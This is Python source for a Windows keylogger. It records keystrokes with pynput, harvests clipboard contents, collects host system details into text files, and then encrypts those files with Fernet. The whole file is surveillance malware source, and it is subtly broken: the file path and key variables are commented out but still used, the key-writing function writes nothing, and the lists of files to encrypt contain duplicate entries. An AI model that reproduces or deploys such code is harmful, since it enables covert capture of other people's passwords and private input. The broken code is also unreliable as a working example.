# Libraries in use
import socket
import platform
import win32clipboard
import win32file
from pynput.keyboard import Key, Listener
import time
import os
from cryptography.fernet import Fernet
import getpass
from requests import get



#file_path = ""
extend = "\\"
file_merger = file_path + extend
#key = ""

# Copying clipboard information

clip_info = "clipboard.txt"

def clip():
    with open(file_path + extend + clip_info, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            clip_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write(" Clipboard Information: " + '\n' + clip_data)
        except:
            file.write("Clipboard contains data that is not a string")


# Time intervals for keylogger
time_length = 15 #in seconds
time_intervals_end = 5

time_intervals = 0
start_time = time.time()
pause_time = time.time() + time_intervals



while time_intervals < time_intervals_end:

# Logging keystroke inputs

    key_info = "key_log.txt"
    count = 0
    key_list = []


    def on_press(key):
        global keys, count, start_time
        print(key)

        key_list.append(key)
        count += 1
        start_time = time.time()
        if count >= 1:
            count = 0
            write_file(key_info)
            key = []


    def write_file(key_info):
        with open(file_path + extend + key_info, "a") as file:
            for key in key_info:
                if key == "'":
                    key = ""
                elif key == "space":
                    var = key == "\n"
                elif key == "Key":
                    key = "\n"

    def off_press(key):
        if key == Key.esc:
            return False
        if start_time > pause_time:
            return False


    with Listener (on_press = on_press, off_press = off_press) as listener:
        listener.join()
    if start_time>pause_time:
        with open(file_path + extend + key_info, "w") as file:
            file.write("  ")

        clip()
        time_intervals += 1
        start_time = time.time()
        pause_time = time.time() + time_length


# Collecting system information

sys_info = "sys_info.txt"

def comp_info():
    with open(file_path + extend + sys_info, "a") as file:
        hostname = socket.gethostname()
        file.write("Processor:" + platform.processor() + '\n')
        file.write("System: " + platform.system() + " " + platform.version() + '\n')
        file.write("Machine: " + platform.machine() + '\n')
        file.write("Hostname: " + hostname + '\n')

comp_info()

# Encryptions

count=0

encrypt_clip = "encrypt_clip.txt"
encrypt_sys = "encrypt_sys.txt"
encrypt_key = "encrypt_key.txt"

main_files = [file_merger + sys_info, file_merger + clip_info, file_merger +sys_info]
encrypted_files = [file_merger + encrypt_key, file_merger + encrypt_clip, file_merger + encrypt_key]

for e in main_files:
    with open(main_files[count], 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypt_data = fernet.encrypt(data)

    with open(encrypted_files[count], 'wb') as file:
        file.write(encrypt_data)
    count += 1



